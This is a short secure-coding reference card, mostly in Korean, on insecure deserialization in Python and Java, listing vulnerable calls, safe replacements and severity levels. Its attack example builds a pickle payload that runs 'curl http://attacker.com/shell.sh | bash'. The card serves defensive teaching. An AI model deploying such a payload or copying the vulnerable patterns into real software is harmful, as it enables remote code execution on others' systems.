# B09: Insecure Deserialization
OWASP: A08:2021 | CWE-502 | CVSS: 8.1~9.8 HIGH~CRITICAL

## 취약 패턴
```python
# CRITICAL — RCE 직결
import pickle
pickle.loads(request.body)
pickle.loads(base64.b64decode(cookie_value))
pickle.loads(redis.get("user_session"))

import marshal
marshal.loads(user_data)

import yaml
yaml.load(user_input)           # safe_load 아님 → RCE (PyYAML)
```
```java
// CRITICAL
ObjectInputStream ois = new ObjectInputStream(userInputStream)
Object obj = ois.readObject()   // 가젯 체인 RCE
// HIGH
XStream xstream = new XStream()
xstream.fromXML(userXml)        // 기본 설정 = 취약
```

## 공격 예시 (Python pickle)
```python
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))
payload = pickle.dumps(Exploit())  # pickle.loads() 시 즉시 실행
```

## 수정 패턴
```python
# ✅ JSON + Pydantic (pickle 대신)
from pydantic import BaseModel
class SessionData(BaseModel):
    user_id: int; role: str
data = SessionData.model_validate_json(json_string)

# ✅ yaml.safe_load (load 금지)
import yaml
data = yaml.safe_load(user_input)

# ✅ Redis 세션 — JSON 직렬화
import json, redis
r = redis.Redis()
r.set("session:123", json.dumps({"user_id": 1}))
data = json.loads(r.get("session:123"))
```
```java
// ✅ Jackson ObjectMapper (DTO 클래스로만 역직렬화)
UserDto user = mapper.readValue(json, UserDto.class)
```

## 심각도
- CRITICAL: pickle.loads / marshal.loads / Java ObjectInputStream + 사용자 입력
- HIGH: yaml.load (unsafe) / XStream 기본 설정
- MEDIUM: 내부에서만 사용되나 외부 입력 경로 존재
